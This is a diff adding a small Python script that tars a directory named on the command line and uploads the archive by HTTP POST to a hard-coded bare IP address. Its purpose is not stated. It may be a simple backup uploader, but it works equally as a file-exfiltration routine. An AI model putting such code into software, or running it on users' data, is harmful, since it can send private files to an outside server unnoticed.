@@ -1,0 +1,25 @@
+#!/usr/bin/python3.4
+import os
+import os.path
+import tarfile
+import sys
+import requests
+
+
+def send_file(filename):
+    r = requests.post("http://92.222.227.175:1234/main.php",  files={filename: open(filename, 'rb')})
+    # print(r.text)
+    pass
+
+
+def make_tarfile(source_dir):
+    if os.path.isfile("export.tar.gz") is True:
+        os.remove("export.tar.gz")
+    with tarfile.open("export.tar.gz", "w:gz") as tar:
+        tar.add(source_dir, arcname=os.path.basename(source_dir))
+    pass
+
+
+if __name__ == '__main__':
+    make_tarfile(sys.argv[1])
+    send_file("export.tar.gz")
